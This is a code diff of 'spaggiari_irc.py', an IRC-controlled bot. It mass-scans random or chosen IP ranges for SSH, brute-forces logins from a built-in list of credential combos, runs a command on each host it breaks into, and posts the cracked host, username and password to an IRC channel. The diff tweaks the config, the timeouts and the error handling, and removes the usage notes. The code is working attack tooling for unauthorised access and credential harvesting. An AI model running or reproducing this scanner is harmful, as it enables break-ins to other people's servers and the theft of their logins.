@@ -4,46 +4,6 @@
 # https://github.com/acidvegas/spaggiari
 # spaggiari_irc.py
 
-'''
-ISC License
-
-Copyright (c) 2016, acidvegas (https://github.com/acidvegas/)
-
-Permission to use, copy, modify, and/or distribute this software for any
-purpose with or without fee is hereby granted, provided that the above
-copyright notice and this permission notice appear in all copies.
-
-THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
-WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
-MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
-ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
-WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
-ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
-OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
-'''
-
-'''
-'sans armes, ni haine, ni violence'
-
-Requirments:
- - Paramiko Library  (http://www.paramiko.org/)
-
-Commands:
- - @random                  | Scan random ip addresses.
- - @range   <class> <range> | Scan a range of ip addresses.
- - @range   <class> random  | Scan a random range of ip addresses.
- - @status                  | Check the scanning status on the bot.
- - @stop                    | Stop all current running scans.
-
-The <class> can be b or c. The <range> is the ip address range prefix to scan.
-
-Examples:
-    @range b 192.168   (Scans the range 192.168.0.0-192.168.255.255)
-    @range c 192.168.1 (Scans the range 192.168.1.0-192.168.1.255)
-    @range b random    (Scans the range ?.?.0.0-?.?.255.255)
-    @range c random    (Scans the range ?.?.?.0-?.?./.255)
-'''
-
 import random
 import re
 import socket
@@ -55,20 +15,20 @@ from collections import OrderedDict
 
 # IRC Config
 server     = 'irc.server.com'
-port       = 6697
+port       = 6667
 use_ipv6   = False
-use_ssl    = True
+use_ssl    = False
 password   = None
 channel    = '#scan'
 key        = None
 admin_host = 'admin.host'
 
 # Throttle Settings
-max_threads     = 150
+max_threads     = 100
 throttle        = 0
 timeout_breaker = 3
-timeout_port    = 10
-timeout_ssh     = 10
+timeout_port    = 5
+timeout_ssh     = 5
 
 # SSH Login Combos
 combos = OrderedDict([
@@ -242,14 +202,14 @@ def ssh_connect(hostname, username, password):
     try:
         ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
         try:
-            stdin,stdout,stderr = ssh.exec_command("echo lol")
+            stdin,stdout,stderr = ssh.exec_command('echo lol')
             for line in stdout.readlines():
                 SpaggiariBot.sendmsg(channel, line)
-        except:
-            pass
+        except Exception as ex:
+            SpaggiariBot.sendmsg(channel, '[{0}] - Failed command execution at {1} using {2}:{3} ({4})'.format(color('-', red), hostname, username, password, ex))
     except socket.timeout:
         return 1
-    except Exception as ex:
+    except:
         return 0
     else:
         SpaggiariBot.sendmsg(channel, '[{0}] - Successful connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
@@ -332,6 +292,7 @@ class IRC(object):
             if cmd == 'random':
                 if not self.scanning:
                     self.sendmsg(chan, '[{0}] - Scanning random IP addresses...'.format(color('#', blue)))
+                    self.scanning = True
                     random_scan().start()
                 else:
                     self.error(chan, 'A scan is already running.')
@@ -415,12 +376,19 @@ class IRC(object):
         while True:
             try:
                 data = self.sock.recv(1024).decode('utf-8')
-                for line in (line for line in data.split('\r\n') if line):
-                    debug(line)
-                    if line.startswith('ERROR :Closing Link:') and self.nickname in data:
-                        raise Exception('Connection has closed.')
-                    elif len(line.split()) >= 2:
-                        self.handle_events(line)
+                if data:
+                    for line in (line for line in data.split('\r\n') if line):
+                        debug(line)
+                        if len(line.split()) >= 2:
+                            if line.startswith('ERROR :Closing Link:'):
+                                raise Exception('Connection has closed.')
+                            else:
+                                self.handle_events(line)
+                else:
+                    error('No data recieved from server.')
+                    break
+            except (UnicodeDecodeError,UnicodeEncodeError):
+                pass
             except Exception as ex:
                 error('Unexpected error occured.', ex)
                 break
